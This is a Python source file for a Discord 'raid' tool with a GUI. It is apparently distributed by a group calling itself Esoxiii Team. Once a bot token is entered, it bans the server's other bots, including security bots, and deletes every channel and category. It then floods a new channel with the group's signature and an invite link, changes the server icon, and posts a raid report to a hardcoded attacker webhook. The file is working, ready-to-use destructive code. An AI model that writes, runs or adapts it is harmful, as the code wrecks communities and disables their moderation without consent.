import discord
from discord.ext import commands
import asyncio
import aiohttp
import requests
from PIL import Image
import io
import tkinter as tk
from tkinter import ttk, messagebox
import threading
import json

class RaidBotGUI:
    def __init__(self, master):
        self.master = master
        master.title("Esoxiii Team Raid Controller")
        master.geometry("500x250")
        master.resizable(False, False)

        # Style configuration
        style = ttk.Style()
        style.configure('TLabel', font=('Arial', 10))
        style.configure('TButton', font=('Arial', 10, 'bold'))
        style.configure('Red.TButton', foreground='red')

        # Token Input Frame
        token_frame = ttk.Frame(master)
        token_frame.pack(pady=10, padx=10, fill='x')

        ttk.Label(token_frame, text="Bot Token:").pack(anchor='w')
        self.token_entry = ttk.Entry(token_frame, width=65, show='•')
        self.token_entry.pack(pady=5, fill='x')

        # Status Frame
        status_frame = ttk.Frame(master)
        status_frame.pack(pady=10, padx=10, fill='x')

        self.status_label = ttk.Label(status_frame, text="Status: Ready. Enter token and press START.")
        self.status_label.pack(anchor='w')

        self.progress = ttk.Progressbar(status_frame, mode='indeterminate')
        self.progress.pack(pady=5, fill='x')

        # Button Frame
        button_frame = ttk.Frame(master)
        button_frame.pack(pady=10)

        self.start_button = ttk.Button(button_frame, text="START RAID", command=self.start_raid, style='Red.TButton')
        self.start_button.pack(side='left', padx=5)

        self.stop_button = ttk.Button(button_frame, text="ABORT", command=self.stop_raid, state='disabled')
        self.stop_button.pack(side='left', padx=5)

        # Bot and raid control variables
        self.bot = None
        self.raid_task = None
        self.is_raiding = False

    def start_raid(self):
        token = self.token_entry.get().strip()
        if not token:
            messagebox.showerror("Error", "Please enter a valid bot token.")
            return

        self.token_entry.config(state='disabled')
        self.start_button.config(state='disabled')
        self.stop_button.config(state='enabled')
        self.status_label.config(text="Status: Initializing Raid Sequence...")
        self.progress.start(10)

        # Run the bot in a separate thread to avoid blocking the GUI
        self.is_raiding = True
        raid_thread = threading.Thread(target=self.run_bot, args=(token,))
        raid_thread.daemon = True
        raid_thread.start()

    def stop_raid(self):
        self.is_raiding = False
        self.status_label.config(text="Status: Abort command sent. Terminating...")
        if self.bot and not self.bot.is_closed():
            asyncio.run_coroutine_threadsafe(self.bot.close(), self.bot.loop)

    def run_bot(self, token):
        # Set up the bot instance and intents
        intents = discord.Intents.all()
        intents.members = True
        self.bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

        @self.bot.event
        async def on_ready():
            self.update_gui(f"Status: Connected as {self.bot.user}. Preparing raid on {self.bot.guilds[0].name}...")
            await asyncio.sleep(2)
            await execute_raid_sequence(self.bot, self.update_gui, self.report_webhook)
            if self.is_raiding:
                await self.bot.close()

        def update_gui_safe(message):
            self.master.after(0, lambda: self.update_gui(message))

        def report_webhook_safe(server_data, error_log):
            self.master.after(0, lambda: self.report_webhook(server_data, error_log))

        # Assign the callbacks
        self.update_gui_callback = update_gui_safe
        self.report_webhook_callback = report_webhook_safe

        # Start the bot
        try:
            self.bot.run(token)
        except Exception as e:
            update_gui_safe(f"Status: Critical Error - {e}")
        finally:
            self.master.after(0, self.raid_finished)

    def update_gui(self, message):
        self.status_label.config(text=message)

    def raid_finished(self):
        self.progress.stop()
        self.token_entry.config(state='normal')
        self.start_button.config(state='enabled')
        self.stop_button.config(state='disabled')
        self.is_raiding = False

    def report_webhook(self, server_data, error_log):
        # This function is called via the callback after the raid
        webhook_url = "https://discord.com/api/webhooks/1410964624173699253/O_0igljImV7LJq-Wj8kZEPCVpsFQ_8pFZYxJkHtArd9KoqG93KMvuGLORsL2oysFCwwO"
        data = {
            "username": f"Esoxiii Team Raid Report | {server_data['name']}",
            "avatar_url": server_data['icon_url'],
            "embeds": [{
                "title": "Raid Execution Report",
                "color": 16711680, # Red
                "fields": [
                    {"name": "Target Server", "value": f"`{server_data['name']}`\nID: `{server_data['id']}`", "inline": True},
                    {"name": "Channels Deleted", "value": str(server_data['channels_deleted']), "inline": True},
                    {"name": "Categories Deleted", "value": str(server_data['categories_deleted']), "inline": True},
                    {"name": "Bots Banned", "value": str(server_data['bots_banned']), "inline": True},
                    {"name": "Errors Encountered", "value": f"```{error_log if error_log else 'None'}```", "inline": False}
                ],
                "thumbnail": {"url": server_data['icon_url']},
                "footer": {"text": "Esoxiii Team | dsc.gg/esoxiiiteam"}
            }]
        }
        try:
            requests.post(webhook_url, json=data)
        except Exception as e:
            print(f"Webhook error: {e}")

async def execute_raid_sequence(bot, update_callback, webhook_callback):
    guild = bot.guilds[0]
    error_log = ""
    server_data = {
        'id': guild.id,
        'name': guild.name,
        'icon_url': guild.icon.url if guild.icon else "https://i.postimg.cc/VkYSYhzc/openart-image-3-IWg-Sg-GT-1756249666434-raw-1.jpg",
        'channels_deleted': 0,
        'categories_deleted': 0,
        'bots_banned': 0
    }

    # PHASE 1: Purge Bots
    update_callback("Status: PHASE 1 - Purging Security & Other Bots...")
    for member in guild.members:
        if member.bot and member != bot.user:
            try:
                await member.ban(delete_message_days=7, reason=":openartimage_3IWgSgGT_1756249666: Raided By Esoxiii Team :openartimage_3IWgSgGT_1756249666:")
                server_data['bots_banned'] += 1
                await asyncio.sleep(0.5)
            except Exception as e:
                error_log += f"Ban {member}: {e}\n"

    # PHASE 2: Delete All Channels and Categories
    update_callback("Status: PHASE 2 - Deleting Channels & Categories...")
    for channel in guild.channels:
        try:
            await channel.delete(reason=":openartimage_3IWgSgGT_1756249666: Raided By Esoxiii Team :openartimage_3IWgSgGT_1756249666:")
            if isinstance(channel, discord.CategoryChannel):
                server_data['categories_deleted'] += 1
            else:
                server_data['channels_deleted'] += 1
            await asyncio.sleep(0.7)
        except Exception as e:
            error_log += f"Delete {channel}: {e}\n"

    # PHASE 3: Create New Category and Channel
    update_callback("Status: PHASE 3 - Creating Raid Signature...")
    try:
        raid_category = await guild.create_category(':openartimage_3IWgSgGT_1756249666:  Raided By Esoxiii Team :openartimage_3IWgSgGT_1756249666:')
        server_data['categories_deleted'] -= 1 # Adjust count since we created one
        text_channel = await guild.create_text_channel(':openartimage_3IWgSgGT_1756249666:  Raided By Esoxiii Team :openartimage_3IWgSgGT_1756249666:', category=raid_category)

        # PHASE 4: Spam Messages
        update_callback("Status: PHASE 4 - Spamming Channel...")
        spam_message = ":openartimage_3IWgSgGT_1756249666:  Raided By Esoxiii Team :openartimage_3IWgSgGT_1756249666:"
        for _ in range(50): # Adjust spam quantity as needed
            try:
                await text_channel.send(spam_message)
            except:
                break
            await asyncio.sleep(0.2)

        # PHASE 5: Final Message
        await text_channel.send(":openartimage_3IWgSgGT_1756249666: Join us dsc.gg/esoxiiiteam :openartimage_3IWgSgGT_1756249666:")

    except Exception as e:
        error_log += f"Create Category/Channel: {e}\n"

    # PHASE 6: Change Server Icon
    update_callback("Status: PHASE 6 - Changing Server Icon...")
    try:
        image_url = "https://i.postimg.cc/VkYSYhzc/openart-image-3-IWg-Sg-GT-1756249666434-raw-1.jpg"
        response = requests.get(image_url)
        image_data = io.BytesIO(response.content)
        await guild.edit(icon=image_data.getvalue(), reason="Esoxiii Team Raid")
    except Exception as e:
        error_log += f"Change Icon: {e}\n"

    update_callback("Status: RAID SEQUENCE COMPLETE. Sending report...")
    webhook_callback(server_data, error_log)
    update_callback("Status: FINISHED. Report sent to webhook. You may close the application.")

if __name__ == "__main__":
    root = tk.Tk()
    app = RaidBotGUI(root)
    root.mainloop()